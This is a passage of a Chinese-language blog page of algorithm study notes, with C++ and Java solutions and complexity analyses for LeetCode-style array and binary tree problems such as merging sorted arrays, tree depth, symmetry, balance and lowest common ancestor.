class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, <span class="type">int</span> m, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> p1 = m - <span class="number">1</span>, p2 = n - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> tail = m + n - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> cur;</span><br><span class="line">        <span class="keyword">while</span> (p1 &gt;= <span class="number">0</span> || p2 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p1 == <span class="number">-1</span>) &#123;</span><br><span class="line">                cur = nums2[p2--];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (p2 == <span class="number">-1</span>) &#123;</span><br><span class="line">                cur = nums1[p1--];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums1[p1] &gt; nums2[p2]) &#123;</span><br><span class="line">                cur = nums1[p1--];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cur = nums2[p2--];</span><br><span class="line">            &#125;</span><br><span class="line">            nums1[tail--] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="两个数组的交集"><a class="markdownIt-Anchor" href="#两个数组的交集">#</a> 两个数组的交集</h3><p>一、哈希表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">intersect</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums1.<span class="built_in">size</span>() &gt; nums2.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">intersect</span>(nums2, nums1);</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_map &lt;<span class="type">int</span>, <span class="type">int</span>&gt; m;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums1) &#123;</span><br><span class="line">            ++m[num];</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; intersection;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums2) &#123;</span><br><span class="line">            <span class="keyword">if</span> (m.<span class="built_in">count</span>(num)) &#123;</span><br><span class="line">                intersection.<span class="built_in">push_back</span>(num);</span><br><span class="line">                --m[num];</span><br><span class="line">                <span class="keyword">if</span> (m[num] == <span class="number">0</span>) &#123;</span><br><span class="line">                    m.<span class="built_in">erase</span>(num);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intersection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>时间复杂度：O (m+n), 空间复杂度：O (min (m,n))</p><p>二、双指针排序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">### 买卖股票的最佳时机</span><br><span class="line"></span><br><span class="line">&gt;输入：[<span class="number">7</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>]</span><br><span class="line">&gt;输出：<span class="number">5</span></span><br><span class="line">&gt;解释：在第 <span class="number">2</span> 天（股票价格 = <span class="number">1</span>）的时候买入，在第 <span class="number">5</span> 天（股票价格 = <span class="number">6</span>）的时候卖出，最大利润 = <span class="number">6</span><span class="number">-1</span> = <span class="number">5</span> 。</span><br><span class="line">&gt;     注意利润不能是 <span class="number">7</span><span class="number">-1</span> = <span class="number">6</span>, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。</span><br><span class="line"></span><br><span class="line">exp:</span><br><span class="line"></span><br><span class="line">**动态规划**</span><br><span class="line"></span><br><span class="line">(来自题解）考虑每次如何获取最大收益，第i天的最大收益通过前i天的最低点就可以算出来。而第i天以前（包括第i天）的最低点和i<span class="number">-1</span>天的最低点有关，因此动态方程为</span><br><span class="line"></span><br><span class="line">dp[i] = <span class="built_in">min</span>(d[i<span class="number">-1</span>],prices[i])</span><br><span class="line">其中dp[<span class="number">0</span>]=prices[<span class="number">0</span>],然后动态计算之后的就可以了。 得到了前i天的最低点以后，只需要维护一个max用来保存最大收益就可以了。 时间复杂度为<span class="built_in">O</span>(n),一次遍历，空间复杂度O（n）的动态规划，代码如下：</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">        <span class="comment">//dp[i]表示截止到i，价格的最低点是多少   dp[i]=min(dp[i-1],nums[i])</span></span><br><span class="line">        <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="type">int</span>[prices.length];</span><br><span class="line">        dp[<span class="number">0</span>] = prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">            dp[i] = (dp[i - <span class="number">1</span>] &lt; prices[i]) ? dp[i - <span class="number">1</span>] : prices[i];</span><br><span class="line">            max = (prices[i] - dp[i]) &gt; max ? prices[i] - dp[i] : max;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br></pre></td></tr></table></figure><p>接着考虑优化空间，仔细观察动态规划的辅助数组，其实每一次只用到了 dp [-1] 这一个空间，因此可以把数组改成单个变量 dp 来存储截止到第 i 天的价格最低点。优化之后的代码就是题解中的方法二。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> inf = <span class="number">1e9</span>;</span><br><span class="line">        <span class="type">int</span> minprice = inf, maxprofit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> price: prices) &#123;</span><br><span class="line">            maxprofit = <span class="built_in">max</span>(maxprofit, price - minprice);</span><br><span class="line">            minprice = <span class="built_in">min</span>(price, minprice);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxprofit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>时间复杂度 O (n), 空间复杂度 O (1)</p><h2 id="树和二叉树"><a class="markdownIt-Anchor" href="#树和二叉树">#</a> 树和二叉树</h2><h3 id="二叉树的深度"><a class="markdownIt-Anchor" href="#二叉树的深度">#</a> 二叉树的深度</h3><p>输入一棵二叉树的根节点，求该树的深度。从根节点到叶节点依次经过的节点（含根、叶节点）形成树的一条路径，最长路径的长度为树的深度。</p><p>例如：</p><p>给定二叉树 [3,9,20,null,null,15,7]，</p><blockquote><p>​3</p></blockquote><blockquote><p>/ <br>9  20<br>/  <br>15   7<br> 返回它的最大深度 3 。</p></blockquote><h4 id="法一dfs"><a class="markdownIt-Anchor" href="#法一dfs">#</a> 法一：DFS</h4><p>树的深度等于左子树的深度和右子树深度的最大值 + 1</p><p><img src="https://pic.leetcode-cn.com/9b063f1f2b7ba125b97a2a11c5f774c0f8ff4df594696993a8eb8282750dae0d-Picture1.png" alt="Picture1.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> leftdeep=<span class="built_in">maxDepth</span>(root-&gt;left);</span><br><span class="line">        <span class="type">int</span> rightdeep = <span class="built_in">maxDepth</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(leftdeep,rightdeep)+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="对称二叉树"><a class="markdownIt-Anchor" href="#对称二叉树">#</a> 对称二叉树</h3><blockquote><p>请实现一个函数，用来判断一棵二叉树是不是对称的。如果一棵二叉树和它的镜像一样，那么它是对称的。</p><p>例如，二叉树 [1,2,2,3,4,4,3] 是对称的。</p><p>1<br>/ <br>2   2<br>/ \ / <br>3  4 4  3<br> 但是下面这个 [1,2,2,null,3,null,3] 则不是镜像对称的:</p><p>1<br>/ <br>2   2<br>\   <br>3    3</p></blockquote><p>题解：</p><p>双指针递归剪枝，结束条件为左右指针同时都为空指针返回 true，如果值不同或只有一个为空返回 false</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isSymmetric</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        TreeNode *l=root;</span><br><span class="line">        TreeNode *r=root;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">recv</span>(l,r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">recv</span><span class="params">(TreeNode * l,TreeNode *r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l==<span class="literal">NULL</span>&amp;&amp;r==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(l==<span class="literal">NULL</span>||r==<span class="literal">NULL</span>||l-&gt;val!=r-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;     <span class="comment">//上面两个位置不能调换</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">recv</span>(l-&gt;left,r-&gt;right)&amp;&amp;<span class="built_in">recv</span>(l-&gt;right,r-&gt;left);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="平衡二叉树"><a class="markdownIt-Anchor" href="#平衡二叉树">#</a> 平衡二叉树</h3><p>平衡二叉树的定义是：二叉树的每个节点的左右子树的高度差的绝对值不超过 11，则二叉树是平衡二叉树。根据定义，一棵二叉树是平衡二叉树，当且仅当其所有子树也都是平衡二叉树，因此可以使用递归的方式判断二叉树是不是平衡二叉树，递归的顺序可以是自顶向下或者自底向上。</p><h4 id="法一-自顶向下递归"><a class="markdownIt-Anchor" href="#法一-自顶向下递归">#</a> 法一： 自顶向下递归</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">height</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">height</span>(root-&gt;left), <span class="built_in">height</span>(root-&gt;right)) + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(<span class="built_in">height</span>(root-&gt;left) - <span class="built_in">height</span>(root-&gt;right)) &lt;= <span class="number">1</span> &amp;&amp; <span class="built_in">isBalanced</span>(root-&gt;left) &amp;&amp; <span class="built_in">isBalanced</span>(root-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>复杂度分析</p><p>时间复杂度：O (n^2)，其中 n 是二叉树中的节点个数。<br>最坏情况下，二叉树是满二叉树，需要遍历二叉树中的所有节点，时间复杂度是 O (n)。<br>对于节点 p，如果它的高度是 d，则 \texttt {height}§height§ 最多会被调用 dd 次（即遍历到它的每一个祖先节点时）。对于平均的情况，一棵树的高度 h 满足 O (h)=O (\log n) O (h)=O (logn)，因为 d \leq hd≤h，所以总时间复杂度为 O (n \log n)。对于最坏的情况，二叉树形成链式结构，高度为 O (n)，此时总时间复杂度为 O (n^2)</p><p>空间复杂度：O (n)，其中 n 是二叉树中的节点个数。空间复杂度主要取决于递归调用的层数，递归调用的层数不会超过 n。</p><h4 id="法二-自底向上递归"><a class="markdownIt-Anchor" href="#法二-自底向上递归">#</a> 法二： 自底向上递归</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">height</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> leftHeight = <span class="built_in">height</span>(root-&gt;left);</span><br><span class="line">        <span class="type">int</span> rightHeight = <span class="built_in">height</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">if</span> (leftHeight == <span class="number">-1</span> || rightHeight == <span class="number">-1</span> || <span class="built_in">abs</span>(leftHeight - rightHeight) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(leftHeight, rightHeight) + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">height</span>(root) &gt;= <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>复杂度分析</p><p>时间复杂度：O (n)，其中 n 是二叉树中的节点个数。使用自底向上的递归，每个节点的计算高度和判断是否平衡都只需要处理一次，最坏情况下需要遍历二叉树中的所有节点，因此时间复杂度是 O (n)。</p><p>空间复杂度：O (n)，其中 n 是二叉树中的节点个数。空间复杂度主要取决于递归调用的层数，递归调用的层数不会超过 n。</p><h3 id="二叉树剪枝"><a class="markdownIt-Anchor" href="#二叉树剪枝">#</a> 二叉树剪枝</h3><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201262036538.png" alt="image-20220126203658273"></p><p>后序遍历 dfs</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">pruneTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        TreeNode *leftnode = <span class="built_in">pruneTree</span>(root-&gt;left);</span><br><span class="line">        TreeNode *rightnode = <span class="built_in">pruneTree</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val==<span class="number">0</span> &amp;&amp; leftnode==<span class="literal">NULL</span>&amp;&amp;rightnode == <span class="literal">NULL</span> )</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        root-&gt;left = leftnode;</span><br><span class="line">        root-&gt;right= rightnode;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="寻找最近公共祖先"><a class="markdownIt-Anchor" href="#寻找最近公共祖先">#</a> 寻找最近公共祖先</h3><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201262218379.png" alt="image-20220126221803111"></p><h4 id="法一递归"><a class="markdownIt-Anchor" href="#法一递归">#</a> 法一：递归</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TreeNode* ans;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;   </span><br><span class="line">        <span class="type">bool</span> lson = <span class="built_in">dfs</span>(root-&gt;left, p, q);</span><br><span class="line">        <span class="type">bool</span> rson = <span class="built_in">dfs</span>(root-&gt;right, p, q);</span><br><span class="line">        <span class="keyword">if</span> ((lson &amp;&amp; rson) || ((root-&gt;val == p-&gt;val || root-&gt;val == q-&gt;val) &amp;&amp; (lson || rson)))<span class="comment">//lson&amp;&amp;rson表示左右子树均包含p或q节点，root恰好是p或q且它的左子树或右子树有一个包含了另一个节点的情况</span></span><br><span class="line">        &#123;</span><br><span class="line">            ans = root;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> lson || rson || (root-&gt;val == p-&gt;val || root-&gt;val == q-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">dfs</span>(root, p, q);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="法二存储父节点"><a class="markdownIt-Anchor" href="#法二存储父节点">#</a> 法二：存储父节点</h4><p>从根节点开始遍历整棵二叉树，用哈希表记录每个节点的父节点指针。<br>从 p 节点开始不断往它的祖先移动，并用数据结构记录已经访问过的祖先节点。<br>同样，我们再从 q 节点开始不断往它的祖先移动，如果有祖先已经被访问过，即意味着这是 p 和 q 的深度最深的公共祖先，即 LCA 节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;<span class="type">int</span>, TreeNode*&gt; fa;</span><br><span class="line">    unordered_map&lt;<span class="type">int</span>, <span class="type">bool</span>&gt; vis;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            fa[root-&gt;left-&gt;val] = root;</span><br><span class="line">            <span class="built_in">dfs</span>(root-&gt;left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;right != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            fa[root-&gt;right-&gt;val] = root;</span><br><span class="line">            <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        fa[root-&gt;val] = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            vis[p-&gt;val] = <span class="literal">true</span>;</span><br><span class="line">            p = fa[p-&gt;val];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (q != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (vis[q-&gt;val]) <span class="keyword">return</span> q;</span><br><span class="line">            q = fa[q-&gt;val];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="二叉搜索树"><a class="markdownIt-Anchor" href="#二叉搜索树">#</a> 二叉搜索树</h3><p>输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的循环双向链表。要求不能创建任何新的节点，只能调整树中节点指针的指向。</p><p>为了让您更好地理解问题，以下面的二叉搜索树为例：</p><p><img src="https://assets.leetcode.com/uploads/2018/10/12/bstdlloriginalbst.png" alt="img"></p><p>我们希望将这个二叉搜索树转化为双向循环链表。链表中的每个节点都有一个前驱和后继指针。对于双向循环链表，第一个节点的前驱是最后一个节点，最后一个节点的后继是第一个节点。</p><p>下图展示了上面的二叉搜索树转化成的链表。“head” 表示指向链表中有最小元素的节点。</p><p><img src="https://assets.leetcode.com/uploads/2018/10/12/bstdllreturndll.png" alt="img"></p><p>特别地，我们希望可以就地完成转换操作。当转化完成以后，树中节点的左指针需要指向前驱，树中节点的右指针需要指向后继。还需要返回链表中的第一个节点的指针。</p><ul><li>思路：</li></ul><p>二叉搜索树 转换成一个 “排序的循环双向链表” ，其中包含三个要素：</p><p>排序链表： 节点应从小到大排序，因此应使用 中序遍历 “从小到大” 访问树的节点。<br>双向链表： 在构建相邻节点的引用关系时，设前驱节点 pre 和当前节点 